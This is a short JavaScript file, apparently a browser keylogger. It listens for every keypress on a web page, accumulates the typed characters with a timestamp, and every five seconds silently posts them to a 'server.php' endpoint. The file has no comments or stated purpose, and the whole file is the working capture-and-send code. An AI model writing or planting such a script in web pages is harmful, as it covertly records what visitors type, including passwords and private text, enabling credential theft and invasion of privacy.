(function(){

    let objeto = {};
    let keys = '';

    document.addEventListener('keypress',(e) =>{
        keys += e.key;
        objeto.keys = keys;
        objeto.time = new Date(Date.now());
    });

    setInterval(function(){
        if(keys !== ''){
            fetch('server.php',{
                method: 'post',
                body: JSON.stringify(objeto)
            })
            keys = '';
        }
    },5000);

})();